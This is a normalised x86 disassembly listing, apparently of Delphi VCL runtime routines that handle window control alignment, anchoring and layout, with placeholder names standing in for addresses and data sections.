mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
test eax eax
jne r-xdata
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c409
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f74
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
cmp esi eax
je r-xdata
mov edx [ eax + 0x40 ]
add [ ebx ] edx
mov edx [ eax + 0x44 ]
add [ ebx + 0x4 ] edx
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_44c414
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448b64
mov eax esi
mov edx [ r-xdata ]
call sub_403304
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_44c448
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44c540
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_448f20
push ebx
push sub_44ded8
call sub_42205c
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42464c
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_4247f4
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4034a0
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46776c
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403fa4
lea eax [ ebx + 0x188 ]
call sub_403f50
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c547
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_44c547
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_44c56c
push ebx
push esi
push edi
call sub_403508
mov ebx edx
mov edi eax
mov eax edi
call sub_42126c
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4057bc
mov eax [ edi + 0x178 ]
call sub_403154
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_447acc
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_44d20c
mov eax edi
call sub_44d44c
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403154
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_44d410
mov esi eax
mov edx esi
mov eax edi
call sub_44d278
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_44d44c
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_448ff8
test bl bl
jle r-xdata
call sub_4220f4
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034f0
sub_44c63c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44c700
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4187a8
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403154
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_4508dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4185b0
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_4186fc
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4185b0
test eax eax
je r-xdata
sub_44c710
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cfb4
xor eax eax
push ebp
push sub_44c750
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44925c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c757
mov eax [ ebp - 0x4 ]
call sub_44cfbc
retn
sub_44c757
mov eax [ ebp - 0x4 ]
call sub_44c63c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44de10
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_44afd4
sub_44c78c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_44c7a7 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_44c818
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_450a20
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_416efc
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44cb99
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cba0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44caae ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44ca11
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_44cba0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44cbcf ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_44cc58
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d44c
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418454
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4185b0
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_44c818
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_44d410
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_41862c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4185b0
mov edx eax
mov ecx ebx
mov eax edi
call sub_44c78c
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_44cdc8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_44d44c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_44d410
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_44d410
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_44ce1c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_44cdc8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44cefb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_44cc58
pop ecx
push ebp
mov al 0x2
call sub_44cc58
pop ecx
push ebp
mov al 0x3
call sub_44cc58
pop ecx
push ebp
mov al 0x4
call sub_44cc58
pop ecx
push ebp
mov al 0x5
call sub_44cc58
pop ecx
push ebp
mov al 0x6
call sub_44cc58
pop ecx
push ebp
xor eax eax
call sub_44cc58
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403154
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403350
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_44cf20
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450a20
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cfb4
xor eax eax
push ebp
push sub_44cfa7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44cfbc
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_44cfe4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d0a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_449824
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d44c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d0b0
mov eax [ ebp - 0xc ]
call sub_403154
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d410
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418454
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_449590
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4185b0
xor ecx ecx
mov edx 0xb03e
call sub_44afd4
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d410
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_44d0b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d44c
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44cfb4
xor edx edx
push ebp
push sub_44d19f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44d44c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d410
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418454
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4185b0
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403154
mov eax [ ebp - 0x4 ]
call sub_44cfbc
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d410
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_449334
mov dl 0x4
call sub_449334
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_4184a0
sub_44d20c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_460ae8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_46480c
sub_44d22c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_448714
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_448714
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_448714
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_44d278
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44873c
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_44873c
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44873c
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44d2c0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403350
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_44afd4
mov edx ebx
mov eax edi
call sub_44d22c
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_44afd4
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44afd4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44afd4
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax edi
call sub_450a20
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_44afd4
mov eax edi
call sub_44de10
jmp r-xdata
mov edx ebx
